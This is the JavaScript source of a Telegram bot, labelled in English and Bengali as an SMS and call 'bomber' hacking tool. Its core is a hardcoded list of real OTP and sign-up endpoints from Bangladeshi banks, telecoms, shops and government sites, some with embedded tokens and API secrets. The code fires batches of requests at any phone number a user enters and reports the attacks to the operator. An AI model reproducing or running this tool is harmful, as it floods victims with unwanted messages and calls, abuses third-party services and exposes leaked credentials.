'use strict';
// ══════════════════════════════════════════════════════
// ULTIMATE SMS + CALL BOMBER BOT
// 400+ APIs Integrated. Unlimited Bombing.
// ══════════════════════════════════════════════════════

// ⚠️ নিচের দুই লাইনে তোমার টোকেন আর আইডি বসাও ⚠️
const TOKEN    = process.env.TOKEN    || 'PUT_YOUR_BOT_TOKEN_HERE';
const ADMIN_ID = String(process.env.ADMIN_ID || 'PUT_YOUR_TELEGRAM_ID_HERE');
// ══════════════════════════════════════════════════════

const TBot   = require('node-telegram-bot-api');
const axios  = require('axios');
const crypto = require('crypto');
const fs     = require('fs');

// ── Config ──
const CFG = {
    TOKEN,
    ADMIN_ID,
    DATA_FILE:       process.env.DATA_FILE || '/tmp/bomber-data.json',
    RATE_LIMIT_MS:   10000,
    RATE_MAX:        5,
};

// ── Logger ──
const log = {
    _w: (l, m) => console.log(`[${new Date().toISOString()}] ${l}: ${m}`),
    info:  m => log._w('INFO ', m),
    warn:  m => log._w('WARN ', m),
    error: m => log._w('ERROR', m),
};

// ── Store ──
let store = { users:{}, pending:{}, rate:{} };
const saveStore = () => { try { const t = CFG.DATA_FILE + '.tmp'; fs.writeFileSync(t, JSON.stringify(store), 'utf8'); fs.renameSync(t, CFG.DATA_FILE); } catch(e){} };
const loadStore = () => { try { if (fs.existsSync(CFG.DATA_FILE)) store = { ...store, ...JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8')) }; } catch(e){} };
loadStore();
setInterval(saveStore, 60000);

function getUser(uid) {
    uid = String(uid);
    if (!store.users[uid]) {
        store.users[uid] = { joined: Date.now(), banned: false, totalBombs: 0 };
        saveStore();
    }
    const u = store.users[uid];
    u.isAdmin = uid === CFG.ADMIN_ID;
    return u;
}
const isAdmin = uid => String(uid) === CFG.ADMIN_ID;
const setPending = (uid, d) => { store.pending[String(uid)] = { ...d, createdAt: Date.now() }; };
const getPending = uid => store.pending[String(uid)] || null;
const delPending = uid => { delete store.pending[String(uid)]; saveStore(); };

function checkRate(uid) {
    uid = String(uid);
    if (isAdmin(uid)) return true;
    const now = Date.now(), r = store.rate[uid];
    if (!r || (now - r.window) > CFG.RATE_LIMIT_MS) { store.rate[uid] = { count: 1, window: now }; return true; }
    if (r.count >= CFG.RATE_MAX) return false;
    r.count++; return true;
}

// ══════════════════════════════════════════════════════
// THE API DATABASE (400+ Endpoints)
// ══════════════════════════════════════════════════════
const RAW_APIS = [
  {"id":"1","name":"QuizGiri","url":"https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=*****&country_code=+880&fcm_token=null","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"2","name":"Shudokko","url":"http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"3","name":"Web Access","url":"http://27.131.15.19/lstyle/api/lsotprequest","method":"post","body":"{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"4","name":"CINESPOT","url":"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-*****/operator-All/send","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"5","name":"Dhaka bank","url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber","method":"post","body":"{\"AccessToken\":\"\",\"TrackingNo\":\"\",\"mobileNo\":\"*****\",\"otpSms\":\"\",\"product_id\":\"250\",\"requestChannel\":\"MOB\",\"trackingStatus\":5}","headers":{"content-type":"application/json"}},
  {"id":"6","name":"CIRCLE","url":"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"7","name":"Health Plus 2","url":"http://45.114.85.19:8080/v3/otp/send?msisdn=88*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"8","name":"IQRA","url":"http://apibeta.iqra-live.com/api/v2/sent-otp/*****","method":"get","body":"","headers":{"x-user-channel":"apps"}},
  {"id":"9","name":"Shajgoj","url":"https://shop.shajgoj.com/wp-admin/admin-ajax.php","method":"post","body":"action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"10","name":"KhaoDao","url":"https://api.eat-z.com/auth/customer/signin","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"11","name":"ALESHA_CARD","url":"https://aleshacard.com/api/register-otp?contact_no=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"12","name":"TheMallBD","url":"https://themallbd.com/api/auth/otp_login","method":"post","body":"{\"phone_number\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"14","name":"Fundesh","url":"https://win.fundesh.com.bd/authSrv/auth/generateOtp","method":"post","body":"{\"msisdn\":\"*****\",\"clientId\":\"d2c_client\"}","headers":{"content-type":"application/json"}},
  {"id":"15","name":"Circle","url":"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"16","name":"Vestige","url":"http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3","method":"post","body":"{\"mobileNumber\":\"88*****\",\"countryId\":22}","headers":{"content-type":"application/json"}},
  {"id":"17","name":"Ajkerdeal","url":"https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null","method":"post","body":"{\"CustomerId\":\"01833268701\",\"MobileOrEmail\":\"*****\",\"Type\":2}","headers":{"content-type":"application/json"}},
  {"id":"19","name":"Arogga","url":"https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0","method":"post","body":"mobile=+88*****&fcmToken=&referral=","headers":{"content-type":"application/json"}},
  {"id":"20","name":"OsudPotro","url":"https://api-2.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/json"}},
  {"id":"23","name":"Nesco","url":"http://nesco.sslwireless.com/api/v1/login","method":"post","body":"phone_number=*****","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"24","name":"ROBI WEB","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"*****\"}","headers":{"content-type":"application/json","Authorization":" Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"}},
  {"id":"26","name":"Bongo","url":"https://api.bongo-solutions.com/auth/api/login/send-otp","method":"post","body":"{\"operator\":\"all\",\"msisdn\":\"88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"27","name":"Cinematic","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88*****","method":"post","body":"","headers":{"content-type":"application/json","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
  {"id":"28","name":"Ali2BD","url":"https://edge.ali2bd.com/api/consumer/v1/auth/login","method":"post","body":"{\"username\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"71","name":"Rabbitholebd","url":"https://apix.rabbitholebd.com/appv2/login/requestOTP","method":"post","body":"{\"mobile\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"72","name":"osudpotro","url":"https://api.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"73","name":"Shopoth","url":"https://api.shopoth.com/shop/api/v1/otps/send","method":"post","body":"{\"phone\":\"*****\"}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"74","name":"AProd","url":"https://prod-api.viewlift.com/identity/signup?site=hoichoitv","method":"post","body":"{\"requestType\":\"send\",\"phoneNumber\":\"+88*****\",\"emailConsent\":true,\"whatsappConsent\":true}","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"75","name":"Go App","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"*****\"}","headers":{"content-type":"application/json"}},
  {"id":"195","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"196","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"197","name":"bhaggo-forget.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"198","name":"bhaggo-reg.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"199","name":"crazy-forget.php","url":"https://api.n1nx-bomber.my.id/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"200","name":"crazy-reg.php","url":"https://api.n1nx-bomber.my.id/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"201","name":"krikaya-forget.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"202","name":"krikaya-reg.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"203","name":"nagad88-forget.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"204","name":"nagad88-reg.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"205","name":"Call1","url":"https://api.blackfire-tools.xyz/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"206","name":"call2","url":"https://api.blackfire-tools.xyz/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"207","name":"call3","url":"https://api.blackfire-tools.xyz/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"208","name":"Call4","url":"https://api.blackfire-tools.xyz/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"209","name":"Call5","url":"https://api.blackfire-tools.xyz/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"210","name":"Call6","url":"https://api.blackfire-tools.xyz/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"211","name":"Call7","url":"https://api.blackfire-tools.xyz/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"212","name":"Call8","url":"https://api.blackfire-tools.xyZ/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"213","name":"Call9","url":"https://api.blackfire-tools.xyz/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"214","name":"Call10","url":"https://api.blackfire-tools.xyz/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"215","name":"BTCL MyBTCL","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"*****\",\"email\":\"\",\"OTPType\":1,\"userName\":\"\"}","headers":{"content-type":"application/json","origin":"https://mybtcl.btcl.gov.bd"}},
  {"id":"217","name":"Bioscope Plus","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en","method":"post","body":"{\"number\":\"+88*****\"}","headers":{"content-type":"application/json"}},
  {"id":"219","name":"BD Tickets","url":"https://api.bdtickets.com:20100/v1/auth","method":"post","body":"{\"createUserCheck\":true,\"phoneNumber\":\"+88*****\",\"applicationChannel\":\"WEB_APP\"}","headers":{"content-type":"application/json"}},
  {"id":"220","name":"Apex4U","url":"https://api.apex4u.com/api/auth/login","method":"post","body":"{\"phoneNumber\":\"0*****\"}","headers":{"content-type":"application/json"}},
  {"id":"221","name":"Swap.com.bd","url":"https://api.swap.com.bd/api/v1/send-otp/v2","method":"post","body":"{\"phone\":\"0*****\"}","headers":{"content-type":"application/json","signature":"JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0="}},
  {"id":"222","name":"Ilyn Global","url":"https://api.ilyn.global/auth/signup","method":"post","body":"{\"phone\":{\"code\":\"BD\",\"number\":\"+880*****\"},\"provider\":\"sms\"}","headers":{"content-type":"application/json","appcode":"ilyn-bd"}},
  {"id":"225","name":"Garibook","url":"https://api.garibookadmin.com/api/v3/user/login","method":"post","body":"{\"mobile\":\"0*****\",\"recaptcha_token\":\"garibookcaptcha\",\"channel\":\"web\"}","headers":{"content-type":"application/json"}},
  {"id":"226","name":"Sheba","url":"https://accountkit.sheba.xyz/api/shoot-otp","method":"post","body":"{\"mobile\":\"+88*****\",\"app_id\":\"8329815A6D1AE6DD\",\"api_token\":\"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH\"}","headers":{"content-type":"application/json;charset=UTF-8"}},
  {"id":"230","name":"GP Web Login","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","method":"post","body":"msisdn=0*****","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"249","name":"Paperfly Registration","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BILLAVAI\",\"company_name\":\"HARDBOMBER\",\"email_address\":\"pro@bomb.bd\",\"phone_number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"271","name":"Bioscopelive Send OTP (GET)","url":"https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp","method":"get","body":"","headers":{}},
  {"id":"326","name":"Banglalink Selfcare OTP","url":"https://selfcare.banglalink.net/api/v1/otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"331","name":"Chaldal Request OTP Verification (API Key)","url":"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey={{apiKey}}&phoneNumber=%2B88{phone}&retryAttempt=0","method":"post","body":"{}","headers":{"content-type":"application/json","x-egg-clientapp":"Omelette"}},
  {"id":"355","name":"Wafilife Send OTP","url":"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3","method":"get","body":"","headers":{}},
  {"id":"389","name":"Walton Plaza GraphQL OTP","url":"https://api.waltonplaza.com.bd/graphql","method":"post","body":"{\"operationName\":\"createCustomerOtp\",\"variables\":{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"998283c0-622a-11ee-84c0-190466a47baa\",\"phone\":\"{phone}\"},\"device\":null},\"query\":\"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }\"}","headers":{"content-type":"application/json"}},
  {"id":"406","name":"BTCL Phonebill OTP (Type 15 Login)","url":"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"OTPType\":15,\"userName\":\"{phone}\",\"isNewPhoneOrEmail\":false}","headers":{"content-type":"application/json"}}
];

// Pre-process API pool
const SMS_POOL = [];
const CALL_POOL = [];

RAW_APIS.forEach(api => {
    // Normalize placeholders (***** -> {phone}, {{phone}} -> {phone})
    let u = api.url.replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
    let b = (api.body || '').replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
    let m = (api.method || 'GET').toUpperCase();
    let h = api.headers || {};
    
    // Clean headers
    delete h['content-length'];
    delete h['Content-Length'];
    
    const ep = { name: api.name, url: u, method: m, body: b, headers: h };
    
    // Separate Call APIs by URL path or Name
    if (u.includes('/call/') || api.name.toLowerCase().includes('call')) {
        CALL_POOL.push(ep);
    } else {
        SMS_POOL.push(ep);
    }
});

log.info(`[Pool] Loaded ${SMS_POOL.length} SMS APIs, ${CALL_POOL.length} Call APIs.`);

// ── Bot ──
const bot = new TBot(CFG.TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
bot.on('polling_error', err => log.error('[Bot] ' + err.message));
const tgMsg = (cid, text, opts = {}) => bot.sendMessage(cid, (text || '').slice(0, 4096), { parse_mode: 'HTML', ...opts }).catch(e => log.warn(`[tgMsg] ${cid}: ${e.message}`));

const sleep = ms => new Promise(r => setTimeout(r, ms));
const renderTpl = (tpl, vars) => (tpl || '').replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');

// ── Bombing Engine ──
async function fireOne(ep, phone) {
    const url = renderTpl(ep.url, { phone });
    const body = renderTpl(ep.body, { phone });
    const timeout = 8000;
    try {
        const r = ep.method === 'POST'
            ? await axios.post(url, body, { headers: ep.headers, timeout, validateStatus: () => true })
            : await axios.get(url, { headers: ep.headers, timeout, validateStatus: () => true });
        const ok = r.status >= 200 && r.status < 400;
        const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const hit = ok && !str.toLowerCase().includes('error') && !str.toLowerCase().includes('fail');
        return { ok: hit, status: r.status, name: ep.name };
    } catch(e) {
        return { ok: false, status: 0, error: e.code || e.message, name: ep.name };
    }
}

async function bomb(type, phone, onProgress) {
    const list = type === 'sms' ? SMS_POOL : CALL_POOL;
    if (!list.length) return { error: 'no_endpoints', sent: 0, hits: 0, fails: 0 };
    
    // Shuffle array
    const shuffled = [...list].sort(() => Math.random() - 0.5);
    
    // Limit to prevent timeout (e.g. max 50 per run)
    const targetList = shuffled.slice(0, 50);
    
    const result = { sent: 0, hits: 0, fails: 0 };
    const start = Date.now();
    
    // Process in parallel batches of 5
    for (let i = 0; i < targetList.length; i += 5) {
        const batch = targetList.slice(i, i + 5);
        const settled = await Promise.all(batch.map(ep => fireOne(ep, phone)));
        
        settled.forEach(r => {
            result.sent++;
            if (r.ok) result.hits++;
            else result.fails++;
        });
        
        if (onProgress) onProgress(result.sent, targetList.length);
        await sleep(500); // slight delay between batches
    }
    
    result.elapsed = Date.now() - start;
    return result;
}

// ── Keyboards ──
const backKb = { inline_keyboard: [[{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]] };
const mainKb = { inline_keyboard: [
    [{ text: '📨 SMS Bomber', callback_data: 'BOMB_SMS' }, { text: '📞 Call Bomber', callback_data: 'BOMB_CALL' }],
]};

// ── Handlers ──
bot.onText(/\/start/, async msg => {
    const cid = String(msg.chat.id);
    if (getUser(cid).banned) return tgMsg(cid, '⛔ আপনি ব্যানড হয়েছেন।');

    await tgMsg(cid, `
┌─────────────────────────────┐
│  💀 <b>HACKING TOOL BOT</b> 💀  │
└─────────────────────────────┘

এই বট দিয়ে আপনি <b>যেকোনো নাম্বারে আনলিমিটেড</b> SMS এবং Call বোম্বিং করতে পারবেন। 

⚡ <b>আমাদের ডাটাবেসে ৪০০+ এপিআই যুক্ত আছে!</b>

👇 নিচের মেনু থেকে আপনার পছন্দের মেনুটা সিলেক্ট করুন।
`, { reply_markup: mainKb });
});

bot.onText(/\/menu/, async msg => {
    if (getUser(msg.chat.id).banned) return;
    tgMsg(msg.chat.id, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb });
});

// Admin commands
bot.onText(/\/ban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = true;
    saveStore(); tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/unban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = false;
    saveStore(); tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/stats/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    tgMsg(msg.chat.id, `📊 <b>Stats</b>\n👥 Users: <b>${Object.keys(store.users).length}</b>\n📨 SMS APIs: <b>${SMS_POOL.length}</b>\n📞 Call APIs: <b>${CALL_POOL.length}</b>`);
});

// Callback Handler
bot.on('callback_query', async cbq => {
    const uid = String(cbq.from.id), chatId = cbq.message.chat.id, msgId = cbq.message.message_id;
    const data = cbq.data;
    if (!checkRate(uid)) return bot.answerCallbackQuery(cbq.id, { text: '⚠️ Slow down!', show_alert: true }).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => bot.deleteMessage(chatId, msgId).catch(()=>{});
    if (getUser(uid).banned) return;

    try {
        if (data === 'M_BACK') { del(); delPending(uid); return tgMsg(chatId, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb }); }

        if (data === 'BOMB_SMS' || data === 'BOMB_CALL') {
            const isSms = data === 'BOMB_SMS';
            const poolSize = isSms ? SMS_POOL.length : CALL_POOL.length;
            if (poolSize === 0) { del(); return tgMsg(chatId, '⚠️ এই ক্যাটাগরিতে কোনো এপিআই নেই।', { reply_markup: backKb }); }
            
            del();
            setPending(uid, { type: isSms ? 'sms' : 'call' });
            
            return tgMsg(chatId, `${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} বোম্বিং</b>\n\nটার্গেট নাম্বারটি দিন (যেমন: <code>+88017XXXXXXXX</code>):`, 
                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
        }
    } catch (err) { log.error('[CB] ' + err.message); }
});

// Message Handler
bot.on('message', async msg => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const uid = String(msg.from.id), text = msg.text.trim();
    if (getUser(uid).banned || !checkRate(uid)) return;
    
    const pend = getPending(uid);
    if (!pend) return;
    delPending(uid);

    if (pend.type === 'sms' || pend.type === 'call') {
        const isSms = pend.type === 'sms';
        let phone = text.replace(/\s+/g, '');
        
        if (!/^\+?\d{10,15}$/.test(phone)) {
            return tgMsg(uid, '❌ ভুল নাম্বার! সঠিক ফরম্যাট: <code>+88017XXXXXXXX</code>', { reply_markup: backKb });
        }
        
        // Strip leading + for API
        const cleanPhone = phone.replace(/^\+/, '');
        
        const proc = await tgMsg(uid, `🚀 <b>বোম্বিং শুরু হচ্ছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n⚙️ এপিআই পুল: ${isSms ? SMS_POOL.length : CALL_POOL.length} টি`);
        
        let lastEdit = 0;
        try {
            const result = await bomb(isSms ? 'sms' : 'call', cleanPhone, (sent, total) => {
                const now = Date.now();
                if (now - lastEdit > 2000) {
                    bot.editMessageText(`🚀 <b>বোম্বিং চলছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📡 প্রসেস: ${sent}/${total}`, { chat_id: uid, message_id: proc.message_id }).catch(()=>{});
                    lastEdit = now;
                }
            });

            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            
            if (result.error) {
                return tgMsg(uid, `❌ এরর: ${result.error}`, { reply_markup: backKb });
            }

            tgMsg(uid, `✅ <b>বোম্বিং সম্পন্ন!</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📨 টোটাল রিকোয়েস্ট: ${result.sent}\n🟢 সফল হিট: <b>${result.hits}</b>\n🔴 ফেইল: ${result.fails}\n⏱ সময়: ${result.elapsed}ms`, 
                { reply_markup: { inline_keyboard: [
                    [{ text: '🔄 আবার বোম্বিং', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],
                    [{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]
                ]}});
                
            tgMsg(CFG.ADMIN_ID, `💣 BOMB | <code>${uid}</code> → +${cleanPhone}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms · ${isSms ? 'SMS' : 'CALL'}`);
            
        } catch (e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, `❌ সিস্টেম এরর: ${e.message}`, { reply_markup: backKb });
        }
    }
});

// Guards
process.on('uncaughtException',  err => log.error('[UNCAUGHT] ' + err.message));
process.on('unhandledRejection', err => log.error('[REJECTION] ' + err.message));
process.on('SIGTERM', () => { saveStore(); process.exit(0); });
process.on('SIGINT',  () => { saveStore(); process.exit(0); });

log.info(`[Bot] Started — admin=${CFG.ADMIN_ID}`);
log.info(`[Pool] SMS=${SMS_POOL.length} Call=${CALL_POOL.length}`);
